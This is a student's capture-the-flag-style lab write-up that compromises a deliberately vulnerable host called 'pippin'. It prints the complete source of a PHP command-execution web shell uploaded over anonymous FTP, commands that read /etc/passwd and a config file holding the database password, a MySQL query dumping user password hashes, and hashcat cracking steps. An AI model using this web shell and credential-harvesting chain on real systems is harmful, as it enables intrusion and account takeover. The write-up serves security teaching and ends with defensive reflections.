# Lab 7.1

## Exploiting Pippin Objectives & Overview

* Scan target for services and version
* Use anonymous ftp user to upload and execute remote code on target
* Using the web shell, find secrets
* Get user access and find other users using Mysql
* Crack passwords for said users

## Scanning the target

The initial scan showed three open services:

* `FTP` on port 21
* `SSH` on port 22
* `HTTP` on port 80

All services were open, and something interesting was shown in the `ftp` field:

```bash
ftp-anon: Anonymous FTP login allowed
```

> This is important for initial access and RCE

## Testing FTP

FTP allows anonymous login meaning we can log into the account anonymous without
a real password

```bash
ftp <target>
anonymous
<password>
```

> Again, password can by anything

This should grant a ftp session. Now we can start testing permissions by
uploading a file. The one directory that is public is `upload`

```Mysql
put <filename>
```

> This should be successful and the file should now show up & be accessible
through a browser

Now that it is confirmed that files can be uploaded, things start to get
interesting. A `webshell` can be used to execute code as the `apache`
user. Below is the shell used for this assignment:

```bash
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body</html>
```

> Credit [Joshua Wright](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)

Now that the `webshell` is uploaded and commands can be run, usernames can be
found by catting the `/etc/passwd` file:

```bash
cat /etc/passwd | grep /bin/bash
```

> This give us three users, I chose to use the `peregrin.took` user because the
hostname is `pippin`

### Finding secrets

Finding usernames is just the start, the target is configured with the
`mediawiki` service. This can be exploited if not set up properly,
(spoiler its not). The file to target is called `LocalSettings.php` and is
located in the web root. Reference the following:

```bash
base64 /var/www/html/LocalSettings.php
```

> My webshell was not rendering the output when catted, the fix was to encode
the output and decode on local machine decoding base64 can be done using the
`base64 -d` command.

This file has some very interesting information. A username and password for
the `mediawiki` db is listed:

```php
## Database settings
$wgDBtype = "mysql";
$wgDBserver = "localhost";
$wgDBname = "mediawiki";
$wgDBuser = "root";
$wgDBpassword = "1Tookie";
```

## User Access and Mysql

Armed with this information, I decided to try logging in as `peregrin.took` with
the password `1Tookie` recovered from the `LocalSettings.php`. This worked and
I was able to login as the local user `peregrin.took`. This user unfortunately
is not part of the `wheel` group, however mysql can now be accessed with the
username and password gather from earlier. Login in mysql as root:

```mysql
mysql -u root -p
Password: 1Tookie
```

Targeting the same mediwiki database a new user was recovered:

```mysql
USE mediawiki;

SELECT user_id, user_name, user_password FROM user;
```

A new user, `pippin` is discovered along with the following hash:

```txt
:pbkdf2:sha512:30000:64:7zMbdjXKrFDDq4CRF5q9ow==:49ImFWdWRVz2dCDsJPj+P0Xovz153VenjKk7npuK7u5xgo21IUh+eY0QH8fQxdH/Cjx3zxZyQcfNChAnP11GNg==
```

## Cracking the hash

In order to get started cracking this hash, it must be prepped for `hashcat`.
The algorithm must be identified and the hash must be isolated. Hashcat has a
list of example hashes that is helpful in identifying what hash mode to use:
[hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes). The hash name
used is `PBKDF2-HMAC-SHA512` and the mode is `12100`. A source that was used
when figuring this out is [hashkiller.io](https://forum.hashkiller.io/index.php?threads/25-reward-need-help-in-formatting-modifying-mediawiki-pbkdf2-sha512-hashes.32787/).

Now that the mode is identified, the hash must be isolated for hashcat. This is
done by removing `pbkdf2`, and `64`. The resulting hash should match this:

```txt
sha512:30000:7zMbdjXKrFDDq4CRF5q9ow==:49ImFWdWRVz2dCDsJPj+P0Xovz153VenjKk7npuK7u5xgo21IUh+eY0QH8fQxdH/Cjx3zxZyQcfNChAnP11GNg==
```

The hash is ready to be cracked using netcat:

```bash
hashcat -m 12100 hash.txt /usr/share/wordlists/rockyou.txt
```

> This will take a long time...

If hashcat is successful the password that is returned will be `palentir`.
Logging in as root using `palentir` as the password will grant root access.

## Notes and Reflections

The mistake made by the system administrator allowed for an initial foothold to
be made in the system. FTP was configured to allow anonymous users which is
vulnerable. This setting should be turned off, however in reality FTP should not
be used in general. Furthermore, the reuse of passwords in this lab is terrible
and should not be done (not to mention the simplicity).
